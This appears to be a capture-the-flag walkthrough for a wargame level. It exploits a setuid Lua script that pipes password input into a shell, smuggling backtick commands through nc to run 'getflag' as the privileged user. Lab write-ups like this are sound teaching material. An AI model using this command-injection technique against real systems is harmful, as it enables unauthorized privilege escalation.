In our home directory, we see a ```lua``` script with suid/guid bit:
    >$ ls -l
    total 4
    -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

    >$ cat level11.lua
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("*all")
      prog:close()

      data = string.sub(data, 1, 40)

      return data
    end


    while 1 do
      local client = server:accept()
      client:send("Password: ")
      client:settimeout(60)
      local l, err = client:receive()
      if not err then
          print("trying " .. l)
          local h = hash(l)

          if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
              client:send("Erf nope..\n");
          else
              client:send("Gz you dumb*\n")
          end

      end

      client:close()
    end

We can see this program waits for a connection with the server running on 127.0.0.1 (hostname) 5151 (port).
It will prompt for a password and pass anything we write to a hashing function.
Let's see if we can exploit that, by tricking it to run `getflag` in the place of the password.
if we try:
    >$ ./level11.lua
we get:
    lua: ./level11.lua:3: address already in use
    stack traceback:
      [C]: in function 'assert'
      ./level11.lua:3: in main chunk
      [C]: ?
so let's check it using netstat to list all running processes:
    >$netstat -tulpn
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
Let's try to connect to this host&port mentioned in the file and try with a `whoami` as password to check our permissions:
    >$ nc 127.0.0.1 5151
    Password: `whoami`
    Erf nope..
We can't see the output of the command, since the script pipes it.
Let's redirect it to a file:
    >$ nc 127.0.0.1 5151
    Password: `whoami` > /tmp/test
    Erf nope..
    >$ cat /tmp/test
    flag11
so now we can try to run getflag as flag11:
    >$ nc 127.0.0.1 5151
    Password: `getflag` > /tmp/token
    Erf nope..
    >$ cat /tmp/token
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Vulnerability:
Subprocess on user-provided input in script run by privileged user -> Privilege escalation via code injection.

Documentation:
* https://www.ionos.com/digitalguide/server/tools/introduction-to-netstat/
* https://linux.die.net/man/1/nc